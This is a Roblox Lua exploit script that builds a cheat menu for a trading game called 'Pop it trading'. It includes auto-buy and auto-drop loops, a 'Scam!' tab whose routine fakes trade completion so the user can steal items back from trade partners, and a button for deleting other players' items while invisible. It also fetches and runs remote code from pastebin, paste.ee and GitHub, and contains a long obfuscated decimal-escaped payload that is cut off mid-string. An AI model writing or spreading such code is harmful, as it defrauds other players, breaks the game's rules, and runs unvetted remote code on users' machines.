local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
local Window = Library.CreateLib("Pop it trading Made by w4l!", "GrapeTheme")
local Tab     = Window:NewTab("Buy Staff!")
local Section = Tab:NewSection("Buy Staff only with cash!")
Section:NewTextBox("Buy Item!", "Dropw", function(lol)
local args = {
		[1] = lol
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy F!", "Buy F!", function()
	local args = {
		[1] = "F"
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Walky Talky!", "Buy Walky Talky!", function()
	local args = {
		[1] = "Walky Talky"
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Box Toy!", "Buy Box Toy!", function()
	local args = {
		[1] = "Box Toy Harambe"
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Green Ooze!", "Buy Green Ooze!", function()
	local args = {
		[1] = "Green Ooze"
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Dart!", "Buy Dart!", function()
	local args = {
		[1] = "Dart"
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy XOX Controller!", "Buy XOX Controller!", function()
	local args = {
		[1] = "XOX Controller"
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Retrol Bike!", "Buy Retrol Bike!", function()
	local args = {
		[1] = "Retro Bike"
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Demogorgan!", "Buy Demogorgan!", function()
	local args = {
		[1] = "Demogorgan"
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Demogorgan Kawaii!", "Buy Demogorgan Kawaii!", function()
	local args = {
		[1] = "Demogorgan Kawaii"
	}
 
	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)

Section:NewButton("Buy Banana", "Buy Banana", function()

	local args = {
		[1] = "The banana"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Rb popit", "Buy Rb popits", function()
	local args = {
		[1] = "Pop It Rainbow!"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Rb Lolly", "Buy Rb Lolly", function()
	local args = {
		[1] = "Lolly Rainbow"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Rb Amogus", "Buy Rb Amogus", function()
	local args = {
		[1] = "Amogus Rainbow"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Crystal Rainbow", "Buy Crystal Rainbow", function()
	local args = {
		[1] = "Crystal Rainbow"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
Section:NewButton("Buy Watermelon", "Buy Watermelon", function()
	local args = {
		[1] = "Watermelon"
	}

	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
end)
local Tab     = Window:NewTab("Auto-Buy")
local Section = Tab:NewSection("Autobuy staff")
Section:NewToggle("auto buy f", "auto buys f", function(state)
    if state then
        _G.on = true
        while _G.on do
            wait()
            local args = {
                [1] = "F"
            }
 
            game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
        end
    else
        _G.on = false
    end
end)
Section:NewToggle("auto buy Walky Talky", "auto buys Walky Talky", function(state)
    if state then
        _G.on = true
        while _G.on do
            wait()
            local args = {
                [1] = "Walky Talky"
            }
 
            game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
        end
    else
        _G.on = false
    end
end)
Section:NewToggle("auto buy Box Toy Harambe", "auto buys Box Toy Harambe", function(state)
    if state then
        _G.on = true
        while _G.on do
            wait()
            local args = {
                [1] = "Box Toy Harambe"
            }
 
            game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
        end
    else
        _G.on = false
    end
end)
Section:NewToggle("auto buy Green Ooze", "auto buys Green Ooze", function(state)
    if state then
        _G.on = true
        while _G.on do
            wait()
            local args = {
                [1] = "Green Ooze"
            }
 
            game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
        end
    else
        _G.on = false
    end
end)
Section:NewToggle("auto buy Dart", "auto buys Dart", function(state)
    if state then
        _G.on = true
        while _G.on do
            wait()
            local args = {
                [1] = "Dart"
            }
 
            game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
        end
    else
        _G.on = false
    end
end)
Section:NewToggle("auto buy XOX Controller", "auto buys XOX Controller", function(state)
    if state then
        _G.on = true
        while _G.on do
            wait()
            local args = {
                [1] = "XOX Controller"
            }
 
            game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
        end
    else
        _G.on = false
    end
end)
Section:NewToggle("auto buy Retro Bike", "auto buys Retro Bike", function(state)
    if state then
        _G.on = true
        while _G.on do
            wait()
            local args = {
                [1] = "Retro Bike"
            }
 
            game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
        end
    else
        _G.on = false
    end
end)
Section:NewToggle("auto buy Demogorgan Kawaii", "auto buys Demogorgan Kawaii", function(state)
    if state then
        _G.on = true
        while _G.on do
            wait()
            local args = {
                [1] = "Demogorgan Kawaii"
            }
 
            game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
        end
    else
        _G.on = false
    end
end)
Section:NewToggle("auto buy Demogorgan", "auto buys Demogorgan", function(state)
    if state then
        _G.on = true
        while _G.on do
            wait()
            local args = {
                [1] = "Demogorgan"
            }
 
            game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(unpack(args))
        end
    else
        _G.on = false
    end
end)

 local Tab     = Window:NewTab("Drop Items")
local Section = Tab:NewSection("Drop stuff (must click to drop)")

Section:NewTextBox("Drop Item!", "Dropsit", function(text)

local A_1 = text
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = text
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)

end)


Section:NewToggle("Auto Drop The banana", "Drop Banan", function(state)
    if state then
_G.on = true

while _G.on == true do
    wait()

wait(0.2)
local A_1 = "The banana"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "The banana"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)

wait(0.2)

    end
    else
_G.on = false
        
    end
end)

    Section:NewButton("Drop Trading ben", "Drops Trading Ben", function()
local A_1 = "Trading Ben"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "Trading Ben"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)
	
end)



    Section:NewToggle("Auto Drop Trading Ben", "Drop Ben", function(state)
    if state then
_G.on = true

while _G.on == true do
    wait()

wait(0.2)
local A_1 = "Trading Ben"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "Trading Ben"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)

wait(0.2)

    end
    else
_G.on = false
        
    end
end)
Section:NewButton("Drop Momeh Long Legs", "Drops Momeh Long Legs", function()
local A_1 = "Mommeh Long Legs"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "Mommeh Long Legs"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)

end)

Section:NewToggle("Auto Drop Mommeh Long Legs", "Drop Mommeh", function(state)
    if state then
_G.on = true

while _G.on == true do
    wait()

wait(0.2)
local A_1 = "Mommeh Long Legs"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "Mommeh Long Legs"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)

wait(0.2)

    end
    else
_G.on = false
        
    end
end)

      Section:NewButton("Drop Munneh", "Drops Munneh", function()
local A_1 = "Munneh"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "Munneh"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)


end)


    Section:NewToggle("Auto Drop Munneh", "Drop Munneh", function(state)
    if state then
_G.on = true

while _G.on == true do
    wait()

wait(0.2)
local A_1 = "Munneh"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "Munneh"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)

wait(0.2)

    end
    else
_G.on = false
        
    end
end)

Section:NewButton("Drop Lenay", "Drops Amogus Rainbow", function()
local A_1 = "Lenay"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "Lenay"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)
	
end)
Section:NewToggle("Auto Drop Lenay", "Drop Amogus", function(state)
    if state then
_G.on = true

while _G.on == true do
    wait()

wait(0.2)
local A_1 = "Lenay"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "Lenay"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)
	
wait(0.2)

    end
    else
_G.on = false
        
    end
end)

    Section:NewButton("XOX!", "Drops Pop It Rainbow!", function()		
local A_1 = "XOX"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "XOX"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
	Event:FireServer(A_1)
	
end)

    Section:NewToggle("Auto Drop XOX", "Drop Pop it", function(state)
    if state then
_G.on = true

while _G.on == true do
    wait()

wait(0.2)
local A_1 = "XOX"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Equip
Event:FireServer(A_1)
wait(0.5)
local A_1 = "XOX"
local Event = game:GetService("ReplicatedStorage").RemoteEvents.Drop
Event:FireServer(A_1)
	
wait(0.2)

    end
    else
_G.on = false
        
    end
end)

local Tab     = Window:NewTab("Scam!")
local Section = Tab:NewSection("Fake drop")
Section:NewButton("Fake Drop", "Fake Drop", function()
game.Players.LocalPlayer.Character.RightHand:Destroy()
end)
Section:NewButton("Reset", "Reset", function()
local accessories = {}
function GodMode()
    if game.Players.LocalPlayer.Character then
        if game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") then
            for _, accessory in pairs(game.Players.LocalPlayer.Character.Humanoid:GetAccessories()) do
                table.insert(accessories, accessory:Clone())
            end
            game.Players.LocalPlayer.Character.Humanoid.Name = "deku"
        end
        local v = game.Players.LocalPlayer.Character["deku"]:Clone()
        v.Parent = game.Players.LocalPlayer.Character
        v.Name = "Humanoid"
        wait(0.1)
        game.Players.LocalPlayer.Character["deku"]:Destroy()
        workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
        for _, accessory in pairs(accessories) do
            game.Players.LocalPlayer.Character.Humanoid:AddAccessory(accessory)
        end
        game.Players.LocalPlayer.Character.Animate.Disabled = true
        wait(0.1)
        game.Players.LocalPlayer.Character.Animate.Disabled = false
    end
end
GodMode()
end)

local Section = Tab:NewSection("Fake Jumping")
Section:NewButton("Fake Jumping", "Fake Jumping", function()
game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
end)
local Section = Tab:NewSection("Fling Item")
Section:NewButton("Fling Item (Click F in KeyBoard to Fling", "Fling Item (Click F in KeyBoard to Fling", function()
getgenv().bind = "F" --keybind to delete popits near you
getgenv().invis = false --turns you invis so people cant see you deleting their stuff (resetting will uninvis you)
getgenv().on = true --setting this to false will stop the script
getgenv().IgnoredList = { --ignored people (script won't delete popits from these people)
    "Person1",
    "Person2",
    "Person3"
}
 
local domain = "paste.ee"
loadstring(game:HttpGet("https://"..domain.."/r/WFYpr/0"))()
wait(0.5)
loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
 end)
 
 Section:NewButton("scam"  , "scam", function()
    -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local on = Instance.new("TextLabel")
local they = Instance.new("TextLabel")
local en = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.0104166707, 0, 0.905277431, 0)
Frame.Size = UDim2.new(0.130729169, 0, 0.06901218, 0)

UICorner.Parent = Frame

on.Name = "on"
on.Parent = Frame
on.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
on.BackgroundTransparency = 1.000
on.Size = UDim2.new(0, 146, 0, 21)
on.Font = Enum.Font.PermanentMarker
on.Text = "On a board: true"
on.TextColor3 = Color3.fromRGB(0, 0, 0)
on.TextScaled = true
on.TextSize = 14.000
on.TextWrapped = true
on.TextXAlignment = Enum.TextXAlignment.Left

they.Name = "they"
they.Parent = Frame
they.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
they.BackgroundTransparency = 1.000
they.Position = UDim2.new(0, 0, 0.294117659, 0)
they.Size = UDim2.new(0, 146, 0, 21)
they.Font = Enum.Font.PermanentMarker
they.Text = "Other side accepted: true"
they.TextColor3 = Color3.fromRGB(0, 0, 0)
they.TextScaled = true
they.TextSize = 14.000
they.TextWrapped = true
they.TextXAlignment = Enum.TextXAlignment.Left

en.Name = "en"
en.Parent = Frame
en.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
en.BackgroundTransparency = 1.000
en.Position = UDim2.new(0, 0, 0.588235319, 0)
en.Size = UDim2.new(0, 212, 0, 21)
en.Font = Enum.Font.PermanentMarker
en.Text = "Scam is enabled: false (G to enable)"
en.TextColor3 = Color3.fromRGB(0, 0, 0)
en.TextScaled = true
en.TextSize = 14.000
en.TextWrapped = true
en.TextXAlignment = Enum.TextXAlignment.Left

--nav

local thatGui = ScreenGui

local Board = Instance.new("ObjectValue", thatGui.Frame)

local YourSide = Instance.new("ObjectValue", Board)

local TheirSide = Instance.new("ObjectValue", Board)

local onV = Instance.new("BoolValue", thatGui.Frame)

local enV = Instance.new("BoolValue", thatGui.Frame)

local theyV = Instance.new("BoolValue", thatGui.Frame)

Board.Name = "Board"

YourSide.Name = "YourSide"

TheirSide.Name = "TheirSide"

onV.Name = "onV"

enV.Name = "enV"

theyV.Name = "theyV"

onV.Value = true

theyV.Value = true

game:GetService("UserInputService").InputBegan:Connect(function(key, gameprocessed)
    if key.KeyCode == Enum.KeyCode.F and not gameprocessed then
        ScreenGui:Destroy()
        
        script:Destroy()
    end
end)

-- Scripts:

local function VRZN_fake_script() -- on.LocalScript
    local script = Instance.new("LocalScript", on)

    while true do
        wait()

        --local success, err = pcall(function()

        if script.Parent.Parent.onV.Value then
            script.Parent.Text = "On a board: " .. "true"
        else
            script.Parent.Text = "On a board: " .. "false"
        end
        --end)

        --print(success, err)
    end
end
coroutine.wrap(VRZN_fake_script)()
local function LWAIXV_fake_script() -- they.LocalScript
    local script = Instance.new("LocalScript", they)

    while true do
        wait()
        --local success, err = pcall(function()
        if script.Parent.Parent.theyV.Value then
            script.Parent.Text = "Other side accepted: " .. "true"
        else
            script.Parent.Text = "Other side accepted: " .. "false"
        end
        --end)
        --print(success, err)
    end
end
coroutine.wrap(LWAIXV_fake_script)()
local function TWYJPK_fake_script() -- en.LocalScript
    local script = Instance.new("LocalScript", en)

    while true do
        wait()

        --local success, err = pcall(function()

        if script.Parent.Parent.enV.Value then
            script.Parent.Text = "Scam is enabled: " .. "true" .. " (G to enable)"
        else
            script.Parent.Text = "Scam is enabled: " .. "false" .. " (G to enable)"
        end
        --end)
        --print(success, err)
    end
end
coroutine.wrap(TWYJPK_fake_script)()
local function UWUJSYO_fake_script() -- Frame.LocalScript
    local script = Instance.new("LocalScript", Frame)

    local UIS = game:GetService("UserInputService")

    UIS.InputBegan:Connect(
        function(key, gameprocessed)
            if key.KeyCode == Enum.KeyCode.G and not gameprocessed then
                script.Parent.enV.Value = not script.Parent.enV.Value
            end
        end
    )
end
coroutine.wrap(UWUJSYO_fake_script)()
local function PVEOOI_fake_script() -- Frame.LocalScript
    local script = Instance.new("LocalScript", Frame)

    local player = game.Players.LocalPlayer

    while true do
        wait()

        local success, err =
            pcall(
            function()
                local yes = false

                for i, v in pairs(workspace.Boards:GetChildren()) do
                    --print(type(v.Player1.Value), type(v.Player2.Value))

                    if v:FindFirstChild("Player1") then
                        if v.Player1.Value == player or v.Player2.Value == player then
                            script.Parent.Board.Value = v

                            local your =
                                v.Player1.Value == player and v.Player1Action or
                                v.Player2.Value == player and v.Player2Action or
                                nil

                            local their =
                                v.Player1.Value ~= player and v.Player1Action or
                                v.Player2.Value ~= player and v.Player2Action

                            script.Parent.Board.YourSide.Value = your

                            script.Parent.Board.TheirSide.Value = their

                            script.Parent.onV.Value = true

                            yes = true

                            break
                        end
                    end

                    if not yes then
                        script.Parent.Board.Value = nil

                        script.Parent.Board.YourSide.Value = nil

                        script.Parent.Board.TheirSide.Value = nil

                        script.Parent.onV.Value = false
                    end
                end
            end
        )
        --print(success, err)
    end
end
coroutine.wrap(PVEOOI_fake_script)()
local function LBYI_fake_script() -- Frame.LocalScript
    local script = Instance.new("LocalScript", Frame)

    while true do
        wait()

        if script.Parent.Board.TheirSide.Value then
            --print(script.Parent.Board.YourSide.Value.Value, script.Parent.Board.TheirSide.Value.Value)

            if script.Parent.Board.TheirSide.Value.Value == "Done" then
                --print("tV")
                script.Parent.theyV.Value = true
            else
                --print("f")
                script.Parent.theyV.Value = false
            end
        else
            --print("f1")
            script.Parent.theyV.Value = false
        end
    end
end
coroutine.wrap(LBYI_fake_script)()
local function LFULR_fake_script() -- Frame.LocalScript
    local script = Instance.new("LocalScript", Frame)

    while true do
        wait()

        local success, err =
            pcall(
            function()
                print(script.Parent.onV.Value, script.Parent.enV.Value, script.Parent.theyV.Value)

                if script.Parent.onV.Value and script.Parent.enV.Value and script.Parent.theyV.Value then
                    print(123)

                    local yourSide

                    local controlNot

                    local helMag = math.huge

                    local bbb

                    for i, v in pairs(script.Parent.Board.Value:GetChildren()) do
                        if v.Name == "Controls" then
                            local mag =
                                (v.Done.Pad.Position -
                                TheirSide.Value.Parent[TheirSide.Value.Name:gsub("Action", "")].Value.Character.HumanoidRootPart.Position).Magnitude

                            if helMag == math.huge then
                                helMag = mag

                                bbb = v
                            elseif mag < helMag then
                                yourSide = bbb
                            else
                                yourSide = v
                            end
                        end
                    end

                    local toTp = yourSide.Done.Pad.CFrame

                    local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()

                    char.HumanoidRootPart.CFrame = toTp + Vector3.new(0, 4, 0)

                    local hedermouth = false

                    local function bsf()
                        local n = false

                        for i, v2 in pairs(workspace.Dropped:GetChildren()) do
                            if
                                v2.Owner.Value == game.Players.LocalPlayer or
                                    v2.Owner.Value == game.Players.LocalPlayer.Character
                                    
                                    --print("take")
                             then
                                 print("take")
                                 
                                 for is, vs in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                                    if vs:IsA("MeshPart") or vs:IsA("BasePart") and v then
                                        print("1n1", v2, vs)
                                        
                                        firetouchinterest(vs, v2.Handle, 1)
                                        
                                        firetouchinterest(vs, v2.Handle, 0)
                                        
                                        --char.HumanoidRootPart.CFrame = v2.Handle.CFrame
                                        
                                        
                                        n = true
                                        
                                        print(2)
                                        
                                        break
                                    end
                                 end
                            
                            print(3)
                            end
                        end

                        if n then
                            wait()
                            
                            bsf()
                        end
                    end

                        bsf()

                        local p = false

                        spawn(function()
                                repeat
                                    game:GetService("ReplicatedStorage").RemoteEvents.Jumped:FireServer()
                                    
                                    print("jmjump")

                                    wait()
                                until p
                        end)

                        wait(3)

                        p = true

                        char.HumanoidRootPart.CFrame = script.Parent.Board.Value.MAIN.CFrame + Vector3.new(0, 4, 0)

                        script.Parent.enV.Value = false
 
                end
            end)

        print(success, err)
    end
end
coroutine.wrap(LFULR_fake_script)()
end)

Section:NewButton("scam2"  , "scam2", function()
    loadstring("\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\88\82\97\121\46\86\97\108\117\101\32\61\32\116\114\117\101\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\9\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\40\39\84\101\114\114\97\105\110\39\41\46\87\97\116\101\114\87\97\118\101\83\105\122\101\32\61\32\48\10\9\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\40\39\84\101\114\114\97\105\110\39\41\46\87\97\116\101\114\87\97\118\101\83\112\101\101\100\32\61\32\48\10\9\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\40\39\84\101\114\114\97\105\110\39\41\46\87\97\116\101\114\82\101\102\108\101\99\116\97\110\99\101\32\61\32\48\10\9\119\111\114\107\115\112\97\99\101\58\70\105\110\100\70\105\114\115\116\67\104\105\108\100\79\102\67\108\97\115\115\40\39\84\101\114\114\97\105\110\39\41\46\87\97\116\101\114\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\48\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\71\108\111\98\97\108\83\104\97\100\111\119\115\32\61\32\102\97\108\115\101\10\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\46\70\111\103\69\110\100\32\61\32\57\101\57\10\9\115\101\116\116\105\110\103\115\40\41\46\82\101\110\100\101\114\105\110\103\46\81\117\97\108\105\116\121\76\101\118\101\108\32\61\32\49\10\9\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\80\97\114\116\34\41\32\111\114\32\118\58\73\115\65\40\34\85\110\105\111\110\79\112\101\114\97\116\105\111\110\34\41\32\111\114\32\118\58\73\115\65\40\34\77\101\115\104\80\97\114\116\34\41\32\111\114\32\118\58\73\115\65\40\34\67\111\114\110\101\114\87\101\100\103\101\80\97\114\116\34\41\32\111\114\32\118\58\73\115\65\40\34\84\114\117\115\115\80\97\114\116\34\41\32\116\104\101\110\10\9\9\9\118\46\77\97\116\101\114\105\97\108\32\61\32\34\80\108\97\115\116\105\99\34\10\9\9\9\118\46\82\101\102\108\101\99\116\97\110\99\101\32\61\32\48\10\9\9\101\108\115\101\105\102\32\118\58\73\115\65\40\34\68\101\99\97\108\34\41\32\116\104\101\110\10\9\9\9\118\46\84\114\97\110\115\112\97\114\101\110\99\121\32\61\32\49\10\9\9\101\108\115\101\105\102\32\118\58\73\115\65\40\34\80\97\114\116\105\99\108\101\69\109\105\116\116\101\114\34\41\32\111\114\32\118\58\73\115\65\40\34\84\114\97\105\108\34\41\32\116\104\101\110\10\9\9\9\118\46\76\105\102\101\116\105\109\101\32\61\32\78\117\109\98\101\114\82\97\110\103\101\46\110\101\119\40\48\41\10\9\9\101\108\115\101\105\102\32\118\58\73\115\65\40\34\69\120\112\108\111\115\105\111\110\34\41\32\116\104\101\110\10\9\9\9\118\46\66\108\97\115\116\80\114\101\115\115\117\114\101\32\61\32\49\10\9\9\9\118\46\66\108\97\115\116\82\97\100\105\117\115\32\61\32\49\10\9\9\101\110\100\10\9\101\110\100\10\9\102\111\114\32\105\44\118\32\105\110\32\112\97\105\114\115\40\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\34\76\105\103\104\116\105\110\103\34\41\58\71\101\116\68\101\115\99\101\110\100\97\110\116\115\40\41\41\32\100\111\10\9\9\105\102\32\118\58\73\115\65\40\34\66\108\117\114\69\102\102\101\99\116\34\41\32\111\114\32\118\58\73\115\65\40\34\83\117\110\82\97\121\115\69\102\102\101\99\116\34\41\32\111\114\32\118\58\73\115\65\40\34\67\111\108\111\114\67\111\114\114\101\99\116\105\111\110\69\102\102\101\99\116\34\41\32\111\114\32\118\58\73\115\65\40\34\66\108\111\111\109\69\102\102\101\99\116\34\41\32\111\114\32\118\58\73\115\65\40\34\68\101\112\116\104\79\102\70\105\101\108\100\69\102\102\101\99\116\34\41\32\116\104\101\110\10\9\9\9\118\46\69\110\97\98\108\101\100\32\61\32\102\97\108\115\101\10\9\9\101\110\100\10\9\101\110\100\10\9\119\111\114\107\115\112\97\99\101\46\68\101\115\99\101\110\100\97\110\116\65\100\100\101\100\58\67\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\99\104\105\108\100\41\10\9\9\99\111\114\111\117\116\105\110\101\46\119\114\97\112\40\102\117\110\99\116\105\111\110\40\41\10\9\9\9\105\102\32\99\104\105\108\100\58\73\115\65\40\39\70\111\114\99\101\70\105\101\108\100\39\41\32\116\104\101\110\10\9\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\82\117\110\83\101\114\118\105\99\101\39\41\46\72\101\97\114\116\98\101\97\116\58\87\97\105\116\40\41\10\9\9\9\9\99\104\105\108\100\58\68\101\115\116\114\111\121\40\41\10\9\9\9\101\108\115\101\105\102\32\99\104\105\108\100\58\73\115\65\40\39\83\112\97\114\107\108\101\115\39\41\32\116\104\101\110\10\9\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\82\117\110\83\101\114\118\105\99\101\39\41\46\72\101\97\114\116\98\101\97\116\58\87\97\105\116\40\41\10\9\9\9\9\99\104\105\108\100\58\68\101\115\116\114\111\121\40\41\10\9\9\9\101\108\115\101\105\102\32\99\104\105\108\100\58\73\115\65\40\39\83\109\111\107\101\39\41\32\111\114\32\99\104\105\108\100\58\73\115\65\40\39\70\105\114\101\39\41\32\116\104\101\110\10\9\9\9\9\103\97\109\101\58\71\101\116\83\101\114\118\105\99\101\40\39\82\117\110\83\101\114\118\105\99\101\39\41\46\72\101\97\114\116\98\101\97\116\58\87\97\105\116\40\41\10\9\9\9\9\99\104\105\108\100\58\68\101\115\116\114\111\121\40\41\10\9\9\9\101\110\100\10\9\9\101\110\100\41\40\41\10\9\101\110\100\41\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\108\111\99\97\108\32\83\99\114\101\101\110\71\117\105\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\83\99\114\101\101\110\71\117\105\34\41\10\108\111\99\97\108\32\70\114\97\109\101\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\70\114\97\109\101\34\41\10\108\111\99\97\108\32\84\101\120\116\76\97\98\101\108\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\76\97\98\101\108\34\41\10\108\111\99\97\108\32\120\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\66\117\116\116\111\110\34\41\10\108\111\99\97\108\32\65\110\116\105\75\105\99\107\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\66\117\116\116\111\110\34\41\10\108\111\99\97\108\32\71\111\100\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\66\117\116\116\111\110\34\41\10\108\111\99\97\108\32\65\110\116\105\66\108\105\110\100\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\66\117\116\116\111\110\34\41\10\108\111\99\97\108\32\65\110\116\105\66\101\97\114\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\66\117\116\116\111\110\34\41\10\108\111\99\97\108\32\73\116\101\109\115\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\66\117\116\116\111\110\34\41\10\108\111\99\97\108\32\84\101\120\116\76\97\98\101\108\95\50\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\101\120\116\76\97\98\101\108\34\41\10\10\45\45\80\114\111\112\101\114\116\105\101\115\5